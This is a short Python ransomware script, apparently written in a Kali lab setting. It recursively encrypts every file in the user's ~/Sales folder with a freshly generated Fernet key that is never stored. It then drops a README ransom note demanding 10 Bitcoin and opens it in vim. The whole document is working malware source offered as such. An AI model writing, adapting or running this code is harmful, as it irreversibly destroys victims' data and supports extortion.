#!/usr/bin/python3

import sys
import subprocess
import os
from cryptography.fernet import Fernet  # Import Fernet directly
import pathlib  # Use pathlib instead of path

# Check and install cryptography if not already imported
try:
    from cryptography.fernet import Fernet
except ImportError:
    subprocess.run(["pip", "install", "cryptography"])

# Generate a key
key = Fernet.generate_key()
fernet = Fernet(key)

# Set the directory path to encrypt
directory_to_encrypt = os.path.expanduser('~/Sales')  # Use expanduser to get the user's home directory

# Loop through the directory and its subdirectories
for root, dirs, files in os.walk(directory_to_encrypt):
    for filename in files:
        filepath = os.path.join(root, filename)

        # Encrypt the chosen file
        with open(filepath, 'rb') as file:
            original = file.read()
        
        encrypted = fernet.encrypt(original)

        with open(filepath, 'wb') as encrypted_file:
            encrypted_file.write(encrypted)

# Create a readme.txt file
readme_file_path = os.path.join(directory_to_encrypt, 'README.txt')
with open(readme_file_path, 'w') as readme_file:
    readme_file.write("You have been hacked by the Swindlers :)\nEverything inside your sales folder has now been encrypted.\nSend us 10 Bitcoin at this URL if you would like your files back. www.swindlerzwinz.com/payday")

subprocess.run(["vim", "/home/kali/Sales/README.txt"])